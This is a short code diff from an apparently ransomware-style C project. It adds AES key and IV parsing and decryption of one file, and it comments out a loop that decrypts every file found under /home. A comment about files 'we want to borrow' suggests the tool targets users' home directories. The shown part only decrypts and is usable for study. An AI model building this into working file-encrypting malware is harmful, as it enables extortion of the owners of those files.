@@ -14,7 +14,18 @@
 
 int main(int argc, char *argv[]){
     //Retrieve key and IV
+    size_t key_length = 32;
+    uint8_t key[key_length];
+    hexStringToBytes(argv[1], key, key_length);
 
+    size_t iv_length = 16;
+    uint8_t iv[iv_length];
+    hexStringToBytes(argv[2], iv, iv_length);
+
+    struct AES_ctx ctx;
+    AES_init_ctx_iv(&ctx, key, iv);
+    decryptFile(ctx, "a.txt.cha");
+    /*
 
     //List all the files we want to borrow ;)
     const char *path = "/home";
@@ -29,4 +40,5 @@ int main(int argc, char *argv[]){
         decryptFile(ctx, "pathList.paths[i]");
     }
     freePathList(&pathList);
+     */
 }
